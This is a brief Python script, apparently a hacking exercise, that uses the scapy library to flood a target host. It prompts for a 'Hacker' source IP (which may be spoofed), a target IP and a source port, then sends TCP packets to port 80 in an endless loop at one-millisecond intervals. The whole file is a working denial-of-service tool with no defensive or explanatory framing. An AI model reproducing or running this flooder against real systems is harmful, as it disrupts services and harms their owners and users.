from scapy.all import *
source_IP = input("Enter IP address of Source (Hacker): ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number (Hacker):"))
i = 1

while True:
    IP1 = IP(src = source_IP, dst = target_IP)
    TCP1 = TCP(sport = source_port, dport = 80)
    pkt = IP1 / TCP1
    send(pkt, inter = .001)

    print ("packet sent ", i)
    i = i + 1

